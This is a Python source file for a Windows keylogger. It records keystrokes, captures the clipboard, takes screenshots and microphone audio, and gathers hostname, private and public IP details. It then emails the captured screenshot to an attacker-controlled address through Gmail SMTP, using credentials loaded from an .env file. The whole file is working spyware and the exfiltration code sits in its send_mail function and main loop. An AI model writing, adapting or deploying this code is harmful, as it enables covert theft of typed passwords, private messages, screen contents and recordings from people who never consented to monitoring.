import socket
import platform
import win32clipboard
import time
import os
import getpass
import sounddevice as sd
import smtplib
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write 
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv(".env")

keys_information = "log.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_file = "audio.wav"
file_path = "C:\\Users\\1337\\Desktop\\Pypros 20\\kl"
extend = "\\"

# how long will each iteration last in seconds ( 3 iterations of 15 seconds here)
time_iteration = 15 
number_of_iterations_end = 3 

toaddr = os.getenv("toaddr")
fromaddr = os.getenv("fromaddr")
password = os.getenv("password")





def send_mail(filename, attachment, toaddr):

	msg = MIMEMultipart()

	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = 'Log Test'

	# body of the email
	body = "Body_of_the_mail"
	msg.attach(MIMEText(body, 'plain'))

	# attachment
	filename = filename
	attachment = open(attachment, 'rb')

	# base
	p = MIMEBase('application', 'octet-stream')

	# ecnode msg
	p.set_payload((attachment).read())
	encoders.encode_base64(p)

	# add header
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

	msg.attach(p)

	# create smtp session
	s = smtplib.SMTP('smtp.gmail.com', 587)

	# start tls & login to gmail
	s.starttls()

	s.login(fromaddr, password)

	text = msg.as_string()

	s.sendmail(fromaddr, toaddr, text)

	s.quit()

# test the email func
# send_mail(keys_information, file_path + extend + keys_information, toaddr)


def sys_info():
	with open(file_path + extend + system_information, "a") as f:
		hostname = socket.gethostname()
		private_ip = socket.gethostbyname(hostname)
		try:
			public_ip = get("https://api.ipify.org").text
		except Exception:
			f.write("Public IP not found!")

		f.write("Processor: " + platform.processor() + "\n")
		f.write("System: " + platform.system() + " " + platform.version() + "\n")
		f.write("Machine: " + platform.machine() + "\n")
		f.write("Hostname: " + hostname + "\n")
		f.write("Public IP: " + public_ip + "\n")
		f.write("Private IP: " + private_ip + "\n")

# test sys_info() func
# sys_info()


def get_clipboard():
	with open(file_path + extend + clipboard_information, "a") as f:
		# only works on copied text/string (no images, video, etc.)
		try:
			win32clipboard.OpenClipboard()
			copied_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			f.write("Copied data: " + "\n" + copied_data + "\n")
		except:
			f.write("Clipboard data unreadable!")

# test get_clipboard() fun
# get_clipboard()


def record_voice():
	# frequency
	fs = 44100
	# time to record
	seconds = 10

	myrecording = sd.rec(int(seconds * fs ), samplerate=fs, channels=2)
	sd.wait()

	write(file_path + extend + audio_file, fs, myrecording)

# testing record_voice() func
# record_voice()
# won't capture keystrokes while recording


def screenshot():
	image = ImageGrab.grab()
	image.save(file_path + extend + screenshot_information)


# base value for the counter (time)
number_of_iterations = 0
current_time = time.time()
stop_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

	count = 0
	keys = []

	def on_press(key):
		global keys, count, current_time

		print(key)
		keys.append(key)
		count += 1
		current_time = time.time()

		if count >= 1:
			count = 0
			write_file(keys)
			keys = []

	def write_file(keys):
		with open(file_path + extend + keys_information, "a") as f:
			# numpad keys are encoded! 
			for key in keys:
				k = str(key).replace("'", "")
				if k.find("space") > 0:
					f.write("\n")
					f.close()

				elif k.find("Key") == -1:
					f.write(k)
					f.close()

	def on_release(key):
		if key == Key.esc:
			return False
		if current_time > stop_time:
			return False

	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

	if current_time > stop_time:

		# clear old logs for new logs to be clean
		with open(file_path + extend + keys_information, "w") as f:
			f.write(" ")

		screenshot()
		
		#if the filename is anything other than screenshot_information , it is sent as binary!
		send_mail(screenshot_information, file_path + extend + screenshot_information, toaddr)

		get_clipboard()

		number_of_iterations += 1 

		current_time = time.time()
		stop_time = time.time() + time_iteration